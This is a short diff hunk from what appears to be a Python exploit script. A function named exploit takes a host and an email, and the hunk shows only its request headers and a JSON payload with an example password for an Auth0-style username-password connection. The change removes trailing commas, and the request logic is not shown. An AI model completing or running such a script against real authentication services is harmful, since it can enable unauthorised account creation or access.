@@ -47,14 +47,14 @@ def exploit(host, mail):
         'Sec-Fetch-Site': 'none',
         'Sec-Fetch-User': '?1',
         'Priority': 'u=0, i',
-        'Content-Type': 'application/json',
+        'Content-Type': 'application/json'
     }
 
     payload = {
         'client_id': '',
         'email': mail,
         'password': 'rQ8a2;3/c[<J',  # Example password
-        'connection': 'Username-Password-Authentication',
+        'connection': 'Username-Password-Authentication'
     }
 
     try:
